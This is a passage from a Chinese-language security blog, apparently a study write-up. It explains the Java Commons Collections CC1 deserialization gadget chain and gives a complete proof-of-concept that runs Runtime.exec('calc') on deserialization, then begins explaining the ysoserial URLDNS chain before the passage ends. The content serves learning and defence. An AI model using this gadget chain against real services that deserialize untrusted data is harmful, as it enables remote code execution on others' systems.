class="built_in">Object</span>,<span class="built_in">Object</span>&gt; transformedmap=TransformedMap.decorate(map,<span class="keyword">null</span>,invokertransformer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">Map</span>.Entry entry:transformedmap.entrySet()) &#123;<span class="comment">//transformedmap.entrySet()就是遍历transformedmap的所有Entry</span></span><br><span class="line">            entry.setValue(r);<span class="comment">//调用setValue方法，并把对象r当作对象传入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.寻找调用了setValue方法的readObject方法</strong></p><p>上面触发setValue用的是遍历的方法，但我们实现序列化和反序列需要用到readObject，所以接下来我们要找一个readObject方法来代替上面遍历Map的功能，我们在<strong>AnnotationInvocationHandler</strong>这个类中看到有个调用了<strong>setValue</strong>方法的<strong>readObject</strong>方法，很完美的实现了代替之前遍历Map功能（其实这里调用setValue也是遍历数组）</p><p><img src="https://bu.dusays.com/2024/06/24/6679221dbc11f.png" alt="image-20240606171227030.png"></p><p>我们查看一下AnnotationInvocationHandler类的构造器</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">AnnotationInvocationHandler</span>(<span class="title class_">Class</span>&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; <span class="keyword">type</span>, <span class="title class_">Map</span>&lt;<span class="title class_">String</span>, <span class="title class_">Object</span>&gt; memberValues) &#123;<span class="comment">//接受两个参数，第一个是继承了注解的class，第二个是个Map,第二个参数我们可控，可以传入我们之前的transformedmap类</span></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt;[] superInterfaces = <span class="keyword">type</span>.<span class="title function_">getInterfaces</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">type</span>.<span class="title function_">isAnnotation</span>() ||</span><br><span class="line">            superInterfaces.<span class="property">length</span> != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.<span class="property">lang</span>.<span class="property">annotation</span>.<span class="property">Annotation</span>.<span class="property">class</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">type</span> = <span class="keyword">type</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">memberValues</span> = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>以上代码解析：</p><p>Annotation是Java的注解，比如<code>@Override</code>重写等。这里先是获取<code>type</code>类所实现的所有接口，注解本质上是一个接口，因此<code>type.getInterfaces()</code>将返回一个数组，其中应该只包含<code>java.lang.annotation.Annotation</code>接口。然后是一个判断语句，先是检查<code>type</code>是否不是一个注解类型，然后检查<code>type</code>是否实现了多个接口，对于注解来说，它应该只实现<code>java.lang.annotation.Annotation</code>接口，再是确认<code>type</code>实现的唯一接口确实是<code>java.lang.annotation.Annotation</code></p></blockquote><p>可以看到这个类中的memberValues是可控的，而这个memberValues正好也是下文用来触发setValue的，但是我们可以看到定义这个类时，并没有public之类的声明，所以说明这个类只能在sun.reflect.annotation这个本包下被调用，我们要想在外部调用，可以反射来解决</p><p>大概链子差不多就完成了：</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="built_in">String</span>[] args) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime r = Runtime.<span class="property">getRuntime</span>();</span><br><span class="line">        InvokerTransformer invokertransformer = <span class="keyword">new </span><span class="class title_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new </span><span class="class title_">Class</span>[]&#123;<span class="built_in">String</span>.<span class="property">class</span>&#125;, <span class="keyword">new </span><span class="class title_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="built_in">HashMap</span>&lt;<span class="built_in">Object</span>, <span class="built_in">Object</span>&gt; <span class="built_in">map</span> = <span class="keyword">new </span><span class="class title_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">map</span>.<span class="property">put</span>(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;<span class="built_in">Object</span>, <span class="built_in">Object</span>&gt; transformedmap = TransformedMap.<span class="property">decorate</span>(<span class="built_in">map</span>, <span class="literal">null</span>, invokertransformer);</span><br><span class="line">        Class c = Class.<span class="property">forName</span>(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = c.<span class="property">getConstructor</span>(Class.<span class="property">class</span>, Map.<span class="property">class</span>);</span><br><span class="line">        constructor.<span class="property">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="built_in">Object</span> o = constructor.<span class="property">newInstance</span>(Override.<span class="property">class</span>, transformedmap);</span><br><span class="line">        <span class="title function_">serialize</span>(o);  <span class="comment">//序列化</span></span><br><span class="line">        <span class="title function_">unserialize</span>(<span class="string">&quot;ser.bin&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> (<span class="built_in">Object</span> obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new </span><span class="class title_">ObjectOutputStream</span>(<span class="keyword">new </span><span class="class title_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.<span class="property">writeObject</span>(obj);</span><br><span class="line">        oos.<span class="property">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> () <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new </span><span class="class title_">ObjectInputStream</span>(<span class="keyword">new </span><span class="class title_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.<span class="property">readObject</span>();</span><br><span class="line">        ois.<span class="property">close</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没弹出计算机，还有几个问题</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p><strong>问题一</strong></p><p>首先是Runtime没有serializable接口，不能被序列化，之前已经分析过如何反射调用Runtime实现rce和transform进行rce的写法，如下</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> c = <span class="keyword">Class</span>.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);<span class="comment">//反射获取Runtime的Class</span></span><br><span class="line">Method getRuntime = c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>);<span class="comment">//获取getRuntime方法，无参方法传null</span></span><br><span class="line"><span class="keyword">Runtime</span> r = (<span class="keyword">Runtime</span>) getRuntime.invoke(<span class="keyword">null</span>, <span class="keyword">null</span>);<span class="comment">//静态方法且是个无参方法，故参数皆为null，相当于获取Runtime实例</span></span><br><span class="line">Method exec = c.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.<span class="keyword">class</span>);<span class="comment">//获取exec方法</span></span><br><span class="line">exec.invoke(r, <span class="string">&quot;calc&quot;</span>);<span class="comment">//反射调用</span></span><br></pre></td></tr></table></figure><blockquote><p>以上代码和之前写的有些不同，貌似与下文相关操作有关，这里是先获取了Runtime的Class，再获取其实例</p></blockquote><p>transform方法的版本</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> c = <span class="keyword">Class</span>.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line"><span class="keyword">Method</span> getRuntimeMethod = (<span class="keyword">Method</span>) <span class="built_in">new</span> InvokerTransformer(&quot;getMethod&quot;,<span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>,<span class="keyword">Class</span>[].<span class="keyword">class</span>&#125;,<span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;&quot;getRuntime&quot;, <span class="keyword">null</span>&#125;).<span class="keyword">transform</span>(c);</span><br><span class="line">//获取getRuntime方法</span><br><span class="line"></span><br><span class="line">Runtime r = (Runtime) <span class="built_in">new</span> InvokerTransformer(&quot;invoke&quot;,<span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;<span class="keyword">Object</span>.<span class="keyword">class</span>,<span class="keyword">Object</span>[].<span class="keyword">class</span>&#125;,<span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;).<span class="keyword">transform</span>(getRuntimeMethod);</span><br><span class="line">//获取getRuntime方法的invoke方法</span><br><span class="line"></span><br><span class="line">InvokerTransformer a = <span class="built_in">new</span> InvokerTransformer(&quot;exec&quot;,<span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>&#125;,<span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">a.<span class="keyword">transform</span>(r);</span><br><span class="line">//获取exec方法，执行calc，或直接写成</span><br><span class="line"><span class="built_in">new</span> InvokerTransformer(&quot;exec&quot;,<span class="built_in">new</span> <span class="keyword">Class</span>[]&#123;String.<span class="keyword">class</span>&#125;,<span class="built_in">new</span> <span class="keyword">Object</span>[]&#123;&quot;calc&quot;&#125;).<span class="keyword">transform</span>(r);</span><br></pre></td></tr></table></figure><p>像以上嵌套再创建有点过于麻烦了，我们可以用Commons Collections库中的ChainedTransformer类来解决这个问题，看下这个类的构造函数还有其重写的transform方法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">public</span> ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">        super();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">public</span> <span class="keyword">Object</span> <span class="keyword">transform</span>(<span class="keyword">Object</span> <span class="keyword">object</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            <span class="keyword">object</span> = iTransformers[i].<span class="keyword">transform</span>(<span class="keyword">object</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">object</span>;</span><br><span class="line">    &#125;    </span><br></pre></td></tr></table></figure><p>以上代码大概意思就是将我们传入Transformer对象数组参数进行递归调用</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Class c = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="type">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;<span class="keyword">String</span>.class,Class[].class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="type">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="type">Class</span>[]&#123;<span class="keyword">String</span>.class&#125;,<span class="keyword">new</span> <span class="type">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">//创建一个Transformer对象数组        </span></span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> <span class="type">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(c);</span><br></pre></td></tr></table></figure><p><strong>问题二</strong></p><p>之前在调用AnnotationInvocationHandler类下的readObject方法时，存在一个判断条件：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, <span class="keyword">Object</span>&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            String <span class="type">name</span> = memberValue.getKey();</span><br><span class="line">            <span class="keyword">Class</span>&lt;?&gt; memberType = memberTypes.<span class="keyword">get</span>(<span class="type">name</span>);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  // i.e. member still <span class="keyword">exists</span></span><br><span class="line">                <span class="keyword">Object</span> <span class="keyword">value</span> = memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(<span class="keyword">value</span>) ||</span><br><span class="line">                      <span class="keyword">value</span> instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="built_in">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            <span class="keyword">value</span>.getClass() + &quot;[&quot; + <span class="keyword">value</span> + &quot;]&quot;).setMember(</span><br><span class="line">                                annotationType.members().<span class="keyword">get</span>(<span class="type">name</span>)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>在第一个if语句处打断点进行调试跟进</p><p><img src="https://bu.dusays.com/2024/06/24/6679221e33e26.png" alt="屏幕截图 2024-06-10 214409.png"></p><p>memberType为空，第一个if语句都进不去</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; memberType = memberTypes.<span class="keyword">get</span>(<span class="type">name</span>);</span><br></pre></td></tr></table></figure><p>这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解Override是没有成员变量的，而另一个注解Target中有个名为value的成员变量</p><p><img src="https://bu.dusays.com/2024/06/24/6679221e1f52f.png" alt="image-20240610214754203.png"></p><p>所以把注解Override改为Target，再将键名改为value即可</p><p><strong>问题三</strong></p><p>上文在CC1链构造的时候其实就存在这个问题，在setValue时，我们传入的value不是Runtime.class</p><p><img src="https://bu.dusays.com/2024/06/24/6679221e40627.png" alt="屏幕截图 2024-06-10 215748.png"></p><p>这时候就要用到Commons Collections库中的ConstantTransformer类了，它里面也重写了transform，它的作用是无论我们传入何值，都会返回一个固定的值，可以和构造器配合使用</p><p><img src="https://bu.dusays.com/2024/06/24/6679221e67427.png" alt="image-20240610220921625.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后给出完整的CC1poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedmap);</span><br><span class="line"></span><br><span class="line">        serialize(o);  <span class="comment">//序列化</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">  -&gt;</span>AnnotationInvocationHandler.readObject<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">    -&gt;</span>TransformedMap.setValue<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">      -&gt;</span>TransformedMap.checkSetValue<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">        -&gt;</span>ChainedTransformer.transform<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">          -&gt;</span>ConstantTransformer.transform<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">          -&gt;</span>InvokerTransformer.transform<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">            -&gt;</span>Method.invoke<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">              -&gt;</span>Class.getMethod<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">          -&gt;</span>InvokerTransformer.transform<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">             -&gt;</span>Method.invoke<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">               -&gt;</span>Runtime.getRuntime<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">          -&gt;</span>InvokerTransformer.transform<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">            -&gt;</span>Method.invoke<span class="function"><span class="params">()</span></span></span><br><span class="line"><span class="function">              -&gt;</span>Runtime.exec()</span><br></pre></td></tr></table></figure><p>反向调用分析</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">反复嵌套再创建InvokerTransformer.transform()可以实现反射调用任意类的任意方法实现rce</span><br><span class="line">-&gt;</span><br><span class="line">ChainedTransformer.transform()会将传入的Transformer对象数组参数进行递归调用，省去反复嵌套</span><br><span class="line">-&gt;</span><br><span class="line">调用TransformedMap.decorate<span class="function"><span class="params">()</span>，将<span class="title">ChainedTransformer</span>的值作为第三个参数的值传入后再将其实例化，这样调用<span class="title">TransformedMap</span>.<span class="title">checkSetValue</span><span class="params">()</span>时就会返回<span class="title">ChainedTransformer</span>.<span class="title">transform</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">触发TransformedMap.checkSetValue<span class="function"><span class="params">()</span>，只需调用自身类中的<span class="title">setValue</span>方法即可，也就是<span class="title">TransformedMap</span>.<span class="title">setValue</span><span class="params">()</span></span></span><br><span class="line"><span class="function">-&gt;</span></span><br><span class="line">调用TransformedMap.setValue()，用到AnnotationInvocationHandler.readObject()中的memberValue.setValue，在AnnotationInvocationHandler类的构造器中将memberValue设置为TransformedMap即可</span><br><span class="line">-&gt;</span><br><span class="line">反序列化调用AnnotationInvocationHandler.readObject()</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://xz.aliyun.com/t/12669?time__1311=mqmhDvqIxfgD8DlxGo4+xCT/pojoqw+D&alichlgref=https://xz.aliyun.com/u/71740">https://xz.aliyun.com/t/12669?time__1311=mqmhDvqIxfgD8DlxGo4%2BxCT%2Fpojoqw%2BD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2Fu%2F71740</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=d1346bdaaaf874724abaf92625935d94">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&amp;vd_source=d1346bdaaaf874724abaf92625935d94</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS链</title>
      <link href="/2024/06/24/URLDNS%E9%93%BE/"/>
      <url>/2024/06/24/URLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><p><code>URLDNS</code> 是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：</p><ul><li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li><li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li><li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li></ul><p>URLDNS.java中最上面的注释中也写明了其调用链</p><p><img src="https://bu.dusays.com/2024/06/24/66791d4f29ce9.png" alt="image-20240515164048627.png"></p><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>首先我们来到Hashmap.java，可以看到是继承了Serializable接口的</p><p><img src="https://bu.dusays.com/2024/06/24/66791d4fa54d8.png" alt="image-20240515164708832.png"></p><p>并且也是重写了readObject方法</p><p><img src="https://bu.dusays.com/2024/06/24/66791d4fab586.png" alt="image-20240515165631413.png"></p><p>详细看下它的readObject方法</p><p><img src="https://bu.dusays.com/2024/06/24/66791d4f53784.png" alt="image-20240515165918492.png"></p><blockquote><p>上述代码解释：</p><ol><li><code>K key = (K) s.readObject();</code>：<code>readObject</code> 方法从输入流 <code>s</code> 中读取一个对象，并将其转换（强制类型转换）为类型 <code>K</code>。该对象被视为键。<code>@SuppressWarnings(&quot;unchecked&quot;)</code> 是一个注解，它告诉编译器忽略接下来的类型安全警告。在这里，警告来自于将读取的对象转换为未经检查的类型 <code>K</code>。</li><li><code>V value = (V) s.readObject();</code>：这行代码的操作与上述读取键的操作类似，但读取的对象是值，转换为类型 <code>V</code>。</li><li><code>putVal(hash(key), key, value, false, false);</code>：这行代码将读取的键和值放入映射中。<code>hash(key)</code> 是用于计算键的哈希值的函数，<code>putVal</code> 